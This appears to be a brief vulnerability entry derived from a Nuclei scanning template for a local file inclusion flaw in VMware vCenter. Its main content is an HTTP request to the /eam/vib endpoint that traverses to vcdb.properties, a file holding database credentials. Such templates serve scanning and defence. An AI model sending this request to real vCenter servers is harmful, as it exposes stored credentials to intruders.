# Vulnerability: VMware vCenter - Local File Inclusion
**Classification:** CWE-22,CWE-73
**Source:** Nuclei Template (`vmware-vcenter-lfi.yaml`)

## Description
VMware vCenter is vulnerable to local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /eam/vib?id={{path}}\vcdb.properties HTTP/1.1
Host: {{Hostname}}
```

